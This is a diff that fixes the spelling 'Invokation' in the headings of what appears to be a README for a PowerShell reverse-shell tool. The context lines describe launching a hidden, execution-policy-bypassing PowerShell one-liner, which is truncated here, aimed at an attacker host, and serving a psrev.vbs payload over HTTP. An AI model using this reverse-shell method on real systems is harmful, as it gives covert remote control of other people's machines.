@@ -19,7 +19,7 @@ This shell doubles as a PowerShell reverse shell. Type $ps on the cmd command li
 
 The script is intended to be launched with the -NonI (non interactive) option of powershell. The result of not running it like this is that PowerShell will try to interactively prompt for missing parameters and your shell will be locked up. As a result of the -NonI option, if you fail to provide the required parameters to a PowerShell command you will not see any error messages, the command simply will not work. So if you are having issues with a command's syntax, be sure to test on your own Windows system from an interactive PowerShell prompt.
 
-## Less Preferred Method of Invokation
+## Less Preferred Method of Invocation
 
  **On Kali:**<br />
 export HOSTIP=10.0.0.22;<br />
@@ -33,7 +33,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip=(gci -path e
 
 This invokation method assumes that you are pasting the text into a shell on Kali and on Windows. The downside is it will 'use up' the existing cmd shell that you have on Windows. The advantage is that you do not have to download any file.
 
-## More Preferred Method of Invokation
+## More Preferred Method of Invocation
 **On Kali - Instructions**<br />
 Set up an HTTP server that is providing access to the psrev.vbs file.<br />
 Then...<br />
